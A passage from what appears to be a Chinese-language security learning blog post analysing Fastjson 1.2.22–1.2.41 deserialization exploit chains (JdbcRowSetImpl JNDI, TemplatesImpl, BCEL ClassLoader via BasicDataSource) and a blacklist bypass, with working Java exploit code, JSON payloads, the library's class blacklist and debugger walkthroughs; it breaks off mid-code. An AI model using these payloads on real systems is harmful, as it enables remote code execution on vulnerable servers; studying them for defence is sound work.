JNDI"></a>Fastjson1.22-1.24 JNDI</h1><h2 id="基于jdbcrowsetimpl的利用链"><a href="#基于JdbcRowSetImpl的利用链" class="headerlink" title="基于JdbcRowSetImpl的利用链"></a>基于JdbcRowSetImpl的利用链</h2><p>他的触发点在**JdbcRowSetImpl#connect()**里面</p><p><img src="https://cdn.clown2024.cn/202408291556886.png" alt="image-20240829155500981"></p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">String payload = &quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:9999/mQAZldWR\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;;<br>JSON.parse(payload);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202408291630333.png" alt="image-20240829163040221"></p><blockquote><p>这里payload用parse或者parseObject都能触发</p><p>这里还学到了用yakit直接搭建JNDI服务器，特别方便</p><p><img src="https://cdn.clown2024.cn/202408291629022.png" alt="image-20240829162951907"></p><p>配置一下payload就能直接用了</p></blockquote><p>看一下利用链过程吧，这是从set方法打的，根据payload我们去看一下setAutoCommit方法，因为我们设置了autoCommit属性他就会走到这</p><p><img src="https://cdn.clown2024.cn/202408291726876.png" alt="image-20240829172622802"></p><p>这里conn一开始为空就会走到connect()方法</p><p><img src="https://cdn.clown2024.cn/202408291730922.png" alt="image-20240829173035857"></p><p><img src="https://cdn.clown2024.cn/202408291730868.png" alt="image-20240829173051811"></p><p>然后我们payload里面控制了一下dataSource属性值为恶意ldap服务器即可</p><p><strong>调试一下执行流程</strong></p><p>其实就是走一下前面没分析的反序列化的过程顺便调一下</p><p><img src="https://cdn.clown2024.cn/202408291632353.png" alt="image-20240829163154441"></p><p>因为要到toJSON方法才会调用get方法，前面直接到parse调用set方法触发更容易满足条件</p><p>一路跟进到这里</p><p><img src="https://cdn.clown2024.cn/202408291705004.png" alt="image-20240829170515929"></p><p>获取一个反序列化器，然后继续往里跟进</p><p><img src="https://cdn.clown2024.cn/202408291700828.png" alt="image-20240829170031726"></p><p>这里建立一个JavaBeanInfo类，里面就进行了对该类的各种字段和方法还有构造器的封装等，后面有链子需要利用到再详细说</p><p><img src="https://cdn.clown2024.cn/202408291649160.png" alt="image-20240829164912083"></p><p>然后继续跟进到执行lookup的地方</p><p><img src="https://cdn.clown2024.cn/202408291719865.png" alt="image-20240829171913782"></p><p>这里的getDataSourceName()我们可以控制</p><p><img src="https://cdn.clown2024.cn/202408291719522.png" alt="image-20240829171950465"></p><p>然后成功弹计算器。</p><p>不过jndi的打法有版本限制、依赖限制以及要出网</p><h1 id="fastjson122-124-templatesimpl"><a href="#Fastjson1-22-1-24-TemplatesImpl" class="headerlink" title="Fastjson1.22-1.24 TemplatesImpl"></a>Fastjson1.22-1.24 TemplatesImpl</h1><p><strong>限制</strong></p><p>该利用链需要设置<code>Feature.SupportNonPublicField</code>才能成功触发</p><p><strong>利用代码</strong></p><p>写一个恶意类继承<strong>AbstractTranslet</strong> </p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Templates;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Evil</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Evil</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> &#123;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers)</span> &#123;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Evil</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Evil</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>再写一个exp</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Templates;<br><br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.*;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">readClass</span><span class="hljs-params">(String cls)</span>&#123;<br>        <span class="hljs-type">byte</span>[] buffer = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(cls);<br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>            <span class="hljs-type">int</span> n;<br>            <span class="hljs-keyword">while</span>((n = fis.read(b))!=-<span class="hljs-number">1</span>) &#123;<br>                bos.write(b,<span class="hljs-number">0</span>,n);<br>            &#125;<br>            fis.close();<br>            bos.close();<br>            buffer = bos.toByteArray();<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        Base64.<span class="hljs-type">Encoder</span> <span class="hljs-variable">encoder</span> <span class="hljs-operator">=</span> Base64.getEncoder();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> encoder.encodeToString(buffer);<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String args[])</span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">evilClassPath</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;user.dir&quot;</span>) + <span class="hljs-string">&quot;\\target\\classes\\org\\clown\\Templates\\Evil.class&quot;</span>;<br>            System.out.println(evilClassPath);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">evilCode</span> <span class="hljs-operator">=</span> readClass(evilClassPath);<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">NASTY_CLASS</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS +<br>                    <span class="hljs-string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilCode+<span class="hljs-string">&quot;\&quot;],&#x27;_name&#x27;:&#x27;&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,&quot;</span> +<br>                    <span class="hljs-string">&quot;\&quot;_version\&quot;:\&quot;\&quot;&#125;\n&quot;</span>;<br><br>            JSON.parseObject(payload, Feature.SupportNonPublicField);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>执行结果</p><p><img src="https://cdn.clown2024.cn/202408301123547.png" alt="image-20240830112259389"></p><p><strong>调用流程分析</strong></p><p>Fastjson默认只会反序列化public修饰的属性，outputProperties和_bytecodes由private修饰，必须加入<code>Feature.SupportNonPublicField</code>在parseObject中才能触发</p><p>现在parseObject下断点，然后跟进</p><p><img src="https://cdn.clown2024.cn/202408301652896.png" alt="image-20240830165233826"></p><p>继续跟进这个DefaultJSONParser方法</p><p><img src="https://cdn.clown2024.cn/202408301658846.png" alt="image-20240830165823736"></p><p>这里token赋的值为12，先记住</p><p><img src="https://cdn.clown2024.cn/202408301700254.png" alt="image-20240830170035160"></p><p>然后继续跟进parseObject方法</p><p><img src="https://cdn.clown2024.cn/202408301704915.png" alt="image-20240830170443834"></p><p>一路跟进到DefaultJSONParser的parse方法，继续往下</p><p><img src="https://cdn.clown2024.cn/202408301706899.png" alt="image-20240830170659818"></p><p>然后根据token为12代表”{“判断到这，我们跟进parseObject方法</p><p><img src="https://cdn.clown2024.cn/202408301709246.png" alt="image-20240830170954179"></p><p>进到这里遍历lexer的text属性里我们传的json字符串，一开始扫描到’”‘字符</p><p>然后就走到下面这里</p><p><img src="https://cdn.clown2024.cn/202408301713804.png" alt="image-20240830171321736"></p><p>然后取得key为@type</p><p><img src="https://cdn.clown2024.cn/202408301715496.png" alt="image-20240830171538418"></p><p>然后继续往下</p><p><img src="https://cdn.clown2024.cn/202408301720580.png" alt="image-20240830172002493"></p><p>这里的DEFAULT_TYPE_KEY就是@type，然后调用scanSymbol()获取到了@type对应的指定类<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>，并调用TypeUtils.loadClass()函数加载该类</p><p>继续往下</p><p><img src="https://cdn.clown2024.cn/202408301723344.png" alt="image-20240830172310261"></p><p>这里对类名进行了判断，涉及到后面新版本绕过黑名单的方法先留意一下</p><p>现在继续往下</p><p><img src="https://cdn.clown2024.cn/202408301725620.png" alt="image-20240830172504533"></p><p>这里通过AppClassLoader加载后put到mappings里面</p><p>返回后，程序继续回到<code>DefaultJSONParser.parseObject()</code>中往下执行，在最后调用<code>JavaBeanDeserializer.deserialze()</code>对目标类进行反序列化</p><p><img src="https://cdn.clown2024.cn/202408301727881.png" alt="image-20240830172750780"></p><p><strong>关键利用链</strong></p><p>来根据payload看一下关键的属性对应的set和get方法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot; + NASTY_CLASS +<br>                    &quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;+evilCode+&quot;\&quot;],&#x27;_name&#x27;:&#x27;&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,&quot; +<br>                    &quot;\&quot;_version\&quot;:\&quot;\&quot;&#125;\n&quot;<br></code></pre></td></tr></table></figure><p>我们知道fastjson的JSON.parseObject会调用get和set方法，这里利用的是TemplatesImpl的get方法</p><p><img src="https://cdn.clown2024.cn/202408302131055.png" alt="image-20240830213116051"></p><p>然后后面其实就是cc链的动态类加载部分，链子如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">TemplatesImpl#newTransformer()-&gt;TemplatesImpl#getTransletInstance()-&gt;TemplatesImpl#defineTransletClasses()-&gt;defineClass<br></code></pre></td></tr></table></figure><p>然后回忆一下有些地方为什么要赋值</p><p><img src="https://cdn.clown2024.cn/202408302145512.png" alt="image-20240830214556445"></p><p>这里_tfactory要调用方法所以不能为空要赋值</p><p><img src="https://cdn.clown2024.cn/202408302146869.png" alt="image-20240830214643793"></p><p>这里要调用defineTransletClasses()方法所以_name!&#x3D;null，_class&#x3D;&#x3D;null后面就没有了</p><blockquote><p>这里y4师傅的payload还带了一个version我不知道为什么，我去掉了也是能够正常弹计算器的</p></blockquote><p><strong>base64</strong></p><p>再看一下为什么需要将字节码进行base64处理</p><p>这是因为FastJson提取byte[]数组字段值时会进行Base64解码，所以我们构造payload时需要对 <code>_bytecodes</code> 进行Base64处理</p><p><img src="https://cdn.clown2024.cn/202408302203171.png" alt="image-20240830220348083"></p><p><img src="https://cdn.clown2024.cn/202408302204473.png" alt="image-20240830220404414"></p><p><strong>关于下划线的处理</strong></p><p><img src="https://cdn.clown2024.cn/202408302206839.png" alt="image-20240830220656753"></p><p>是在这个地方的smartMatch函数</p><p><img src="https://cdn.clown2024.cn/202408302207795.png" alt="image-20240830220749721"></p><p>然后在这里将下划线进行了替换</p><h1 id="fastjson1115-1224与bcel字节码加载"><a href="#Fastjson1-1-15-1-2-24与BCEL字节码加载" class="headerlink" title="Fastjson1.1.15-1.2.24与BCEL字节码加载"></a>Fastjson1.1.15-1.2.24与BCEL字节码加载</h1><p>参考文章：<a href="https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html">BCEL ClassLoader去哪了 | 离别歌 (leavesongs.com)</a>，<a href="https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html">Java动态类加载，当FastJson遇到内网 – KINGX</a></p><p>这种和上面的TemplatesImpl链子打法都可以用于不出网的打法，不过比TemplatesImpl利用更广泛一点</p><p>这里我们还需要一个依赖</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-dbcp<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-dbcp<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.4<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>先给出只用parse就能触发的payload形式</p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">//这个可有可无都不影响</span><br>        <span class="hljs-attr">&quot;x&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.commons.dbcp.BasicDataSource&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;driverClassLoader&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;driverClassName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$$BCEL$$$l$8b$I$A$...&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;x&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>利用代码：</p><p>Evil.java</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.BECL;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Evil</span> &#123;<br>    <span class="hljs-keyword">static</span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.BECL;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.Repository;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">demo1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">JavaClass</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> Repository.lookupClass(Evil.class);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> Utility.encode(cls.getBytes(), <span class="hljs-literal">true</span>);<br>        System.out.println(code);<br><span class="hljs-comment">//        String payload=&quot;&#123;\n&quot; +</span><br><span class="hljs-comment">//                &quot;        \&quot;@type\&quot;: \&quot;org.apache.commons.dbcp.BasicDataSource\&quot;,\n&quot; +</span><br><span class="hljs-comment">//                &quot;        \&quot;driverClassLoader\&quot;: &#123;\n&quot; +</span><br><span class="hljs-comment">//                &quot;            \&quot;@type\&quot;: \&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;\n&quot; +</span><br><span class="hljs-comment">//                &quot;        &#125;,\n&quot; +</span><br><span class="hljs-comment">//                &quot;        \&quot;driverClassName\&quot;: \&quot;$$BCEL$$&quot;+code+&quot;\&quot;\n&quot; +</span><br><span class="hljs-comment">//                &quot;&#125;&quot;;  //这个在parseObject的时候适用</span><br>        String payload=<span class="hljs-string">&quot;&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;: \&quot;com.alibaba.fastjson.JSONObject\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;x\&quot;:&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                \&quot;@type\&quot;: \&quot;org.apache.commons.dbcp.BasicDataSource\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;                \&quot;driverClassLoader\&quot;: &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                    \&quot;@type\&quot;: \&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;                \&quot;driverClassName\&quot;: \&quot;$$BCEL$$&quot;</span>+code+<span class="hljs-string">&quot;\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &#125;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#125;: \&quot;x\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409040119696.png" alt="image-20240904011923509"></p><p><strong>利用链分析</strong></p><p>去看一下BasicDataSource的源码中对应的关键方法</p><p><img src="https://cdn.clown2024.cn/202409032251464.png" alt="image-20240903225126325"></p><p><img src="https://cdn.clown2024.cn/202409032305310.png" alt="image-20240903230514187"></p><p>好吧想自己去看发现好像这个调用不太一样，这是会调用的set方法，文章的利用链如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">BasicDataSource.getConnection() -&gt; createDataSource() -&gt; createConnectionFactory()<br></code></pre></td></tr></table></figure><p>这是文章的解释：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">按理说应该是不会调用到getConnection方法的，原PoC中很巧妙的利用了 JSONObject对象的 toString() 方法实现了突破。JSONObject是Map的子类，在执行toString() 时会将当前类转为字符串形式，会提取类中所有的Field，自然会执行相应的 getter 等方法。<br><br>首先，在 &#123;“@type”: “org.apache.tomcat.dbcp.dbcp2.BasicDataSource”……&#125; 这一整段外面再套一层&#123;&#125;，反序列化生成一个 JSONObject 对象。<br><br>然后，将这个 JSONObject 放在 JSON Key 的位置上，在 JSON 反序列化的时候，FastJson 会对 JSON Key 自动调用 toString() 方法，于是乎就触发了BasicDataSource.getConnection()。<br></code></pre></td></tr></table></figure><blockquote><p>感觉文章讲得都有点怪，然后自己调了半天才找到确切位置，接下来分析也不知道正不正确，能说服我自己就好（</p></blockquote><p><img src="https://cdn.clown2024.cn/202409040058412.png" alt="image-20240904005819248"></p><p>首先走到parseObject这里，然后一直往下</p><p><img src="https://cdn.clown2024.cn/202409040100256.png" alt="image-20240904010058091"></p><p>走到这会调用key的toString方法，这时候value为BasicDataSource的时候是关键我们跟进去看</p><p><img src="https://cdn.clown2024.cn/202409040103451.png" alt="image-20240904010314293"></p><p>然后到这个write方法，继续往下</p><p><img src="https://cdn.clown2024.cn/202409040105060.png" alt="image-20240904010542894"></p><p>然后进到一个Map的遍历里面，前面进行了一些操作将他转成了Map类型，继续往下</p><p><img src="https://cdn.clown2024.cn/202409040108276.png" alt="image-20240904010839142"></p><p>这里就是最后的方法了，对字段进行遍历</p><p><img src="https://cdn.clown2024.cn/202409040111143.png" alt="image-20240904011101980"></p><p>这里对每个field进行遍历，然后调用他们的get方法，这里遍历到connection就会调用我们提到的getConnection</p><p><img src="https://cdn.clown2024.cn/202409040112186.png" alt="image-20240904011236055"></p><p><img src="https://cdn.clown2024.cn/202409040113127.png" alt="image-20240904011312996"></p><p><img src="https://cdn.clown2024.cn/202409040051567.png" alt="image-20240904005104420"></p><p>最终成功调用，其实调的我还是有点不明不白，只能说大致知道</p><p>如果是parseObject的话，他会触发所有get和set方法，直接这种payload也可以：</p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;driverClassLoader&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;driverClassName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$$BCEL$$$l$8b......&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>除了上面的依赖还有一些适用更广泛的依赖，不过利用依旧是BasicDataSource类</p><p>在旧版本的 tomcat-dbcp 包中，对应的路径是 org.apache.tomcat.dbcp.dbcp.BasicDataSource</p><p>比如：6.0.53、7.0.81等版本</p><p>在Tomcat 8.0之后包路径有所变化，更改为了 org.apache.tomcat.dbcp.dbcp2.BasicDataSource</p><h1 id="fastjson1225-1241绕过"><a href="#Fastjson1-2-25-1-2-41绕过" class="headerlink" title="Fastjson1.2.25-1.2.41绕过"></a>Fastjson1.2.25-1.2.41绕过</h1><p>Fastjson在1.2.25版本就加入了黑白名单机制</p><p>这时候我们再去执行前面的exp就会爆出下面的错误</p><p><img src="https://cdn.clown2024.cn/202408302326388.png" alt="image-20240830232605306"></p><p>再去看ParserConfig里面可以看到很多类被加入了黑名单</p><p><img src="https://cdn.clown2024.cn/202408302328066.png" alt="image-20240830232822995"></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">bsh<br>com.mchange<br>com.sun.<br>java.lang.Thread<br>java.net.Socket<br>java.rmi<br>javax.xml<br>org.apache.bcel<br>org.apache.commons.beanutils<br>org.apache.commons.collections.Transformer<br>org.apache.commons.collections.functors<br>org.apache.commons.collections4.comparators<br>org.apache.commons.fileupload,org.apache.myfaces.context.servlet<br>org.apache.tomcat<br>org.apache.wicket.util<br>org.codehaus.groovy.runtime<br>org.hibernate<br>org.jboss,org.mozilla.javascript<br>org.python.core<br>org.springframework<br></code></pre></td></tr></table></figure><p>先给出绕过的payload</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Templates;<br><br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.*;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">readClass</span><span class="hljs-params">(String cls)</span>&#123;<br>        <span class="hljs-type">byte</span>[] buffer = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(cls);<br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>            <span class="hljs-type">int</span> n;<br>            <span class="hljs-keyword">while</span>((n = fis.read(b))!=-<span class="hljs-number">1</span>) &#123;<br>                bos.write(b,<span class="hljs-number">0</span>,n);<br>            &#125;<br>            fis.close();<br>            bos.close();<br>            buffer = bos.toByteArray();<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        Base64.<span class="hljs-type">Encoder</span> <span class="hljs-variable">encoder</span> <span class="hljs-operator">=</span> Base64.getEncoder();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> encoder.encodeToString(buffer);<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String args[])</span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">evilClassPath</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;user.dir&quot;</span>) + <span class="hljs-string">&quot;\\target\\classes\\org\\clown\\Templates\\Evil.class&quot;</span>;<br>            System.out.println(evilClassPath);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">evilCode</span> <span class="hljs-operator">=</span> readClass(evilClassPath);<br>            ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>); <span class="hljs-comment">//开启AutoTypeSupport</span><br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">NASTY_CLASS</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Lcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;&quot;</span>; <span class="hljs-comment">//前面加了L，结尾加了;</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS +<br>                    <span class="hljs-string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilCode+<span class="hljs-string">&quot;\&quot;],&#x27;_name&#x27;:&#x27;&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;&quot;</span>;<br><br>            JSON.parseObject(payload, Feature.SupportNonPublicField);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    